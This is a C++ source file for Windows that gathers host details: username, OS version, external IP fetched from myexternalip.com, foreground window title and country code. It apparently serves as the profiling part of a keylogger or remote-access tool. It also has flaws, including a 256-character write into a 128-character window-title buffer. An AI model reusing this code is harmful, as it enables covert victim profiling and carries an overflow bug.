//
// Created by LUNAFE on 2022-02-04.
//

#include "event_handler.h"


void EventHandler::GetComputerName(wchar_t *buf) {
    try {
        wchar_t folder[MAX_PATH];
        GetEnvironmentVariableW(L"UserProfile", folder, MAX_PATH);

        wchar_t test[MAX_PATH];
        Util::Trim(folder, 9, test);

        wcscpy(buf, test);
    } catch (int ex) {
        wprintf(L"[DEBUG] ERROR_GET_NAME!\n[DEBUG] ERROR_CODE: %d", ex);
        exit(-1);
    }
}


void EventHandler::GetOsVersion(wchar_t *buf) {
    try {
        typedef NTSTATUS(WINAPI *LPFN_RTLGETVER)(LPOSVERSIONINFOEXW);
        LPFN_RTLGETVER fnRtlGetVer;

        HMODULE h = GetModuleHandle(("ntdll"));
        fnRtlGetVer = (LPFN_RTLGETVER) GetProcAddress(h, "RtlGetVersion");
        if (fnRtlGetVer) {
            OSVERSIONINFOEXW os_info;

            os_info.dwOSVersionInfoSize = sizeof(os_info);
            fnRtlGetVer(&os_info);

            if (os_info.dwMajorVersion == 10 && os_info.dwMinorVersion == 0) {
                if (os_info.dwBuildNumber >= 22000) {
                    wcscpy(buf, L"Windows 11");
                } else {
                    wcscpy(buf, L"Windows 10");
                }
            } else if (os_info.dwMajorVersion == 6) {
                if (os_info.dwMinorVersion == 3) {
                    wcscpy(buf, L"Windows 8.1");
                } else if (os_info.dwMinorVersion == 2) {
                    wcscpy(buf, L"Windows 8");
                } else if (os_info.dwMinorVersion == 1) {
                    wcscpy(buf, L"Windows 7");
                } else if (os_info.dwMinorVersion == 0) {
                    wcscpy(buf, L"Windows Vista");
                }
            } else {
                wcscpy(buf, L"Windows XP");
            }
        }
    } catch (int ex) {
        wprintf(L"[DEBUG] ERROR_GET_OS!\n[DEBUG] ERROR_CODE: %d", ex);
        exit(-1);
    }
}

void EventHandler::GetIp(wchar_t *buf_) {
    try {
        HINTERNET net = InternetOpen("IP retriever",
                                     INTERNET_OPEN_TYPE_PRECONFIG,
                                     NULL,
                                     NULL,
                                     0);

        HINTERNET conn = InternetOpenUrl(net,
                                         "http://myexternalip.com/raw",
                                         NULL,
                                         0,
                                         INTERNET_FLAG_RELOAD,
                                         0);

        char buffer[4096];
        DWORD read;

        InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
        InternetCloseHandle(net);

        wchar_t *buf;

        int buf_size = MultiByteToWideChar(CP_ACP, 0, buffer, -1, NULL, NULL);
        buf = new WCHAR[buf_size];
        MultiByteToWideChar(CP_ACP, 0, buffer, strlen(buffer) + 1, buf, buf_size);

        wcscpy(buf_, buf);
    } catch (int ex) {
        wprintf(L"[DEBUG] ERROR_GET_IP!\n[DEBUG] ERROR_CODE: %d", ex);
        exit(-1);
    }
}

void EventHandler::GetActiveWindow(wchar_t *buf) {
    try {
        HWND foreground = GetForegroundWindow();
        if (foreground) {
            wchar_t window_title[128];
            GetWindowTextW(foreground, window_title, 256);
            if (wcslen(window_title) > 0) {
                wcscpy(buf, window_title);
            } else {
                wcscpy(buf, L"Background");
            }
        }
    } catch (int ex) {
        wprintf(L"[DEBUG] ERROR_GET_WINDOW!\n[DEBUG] ERROR_CODE: %d", ex);
        exit(-1);
    }
}

void EventHandler::GetGeoId(wchar_t *buf) {
    try {
        GEOID my_geo = GetUserGeoID(GEOCLASS_NATION);
        int buffer_size = GetGeoInfoW(my_geo, GEO_ISO2, NULL, 0, 0);
        WCHAR *buffer = new WCHAR[buffer_size];
        int result = GetGeoInfoW(my_geo, GEO_ISO2, buffer, buffer_size, 0);
        wcscpy(buf, buffer);
    } catch (int ex) {
        wprintf(L"[DEBUG] ERROR_GET_GEOID!\n[DEBUG] ERROR_CODE: %d", ex);
        exit(-1);
    }
}


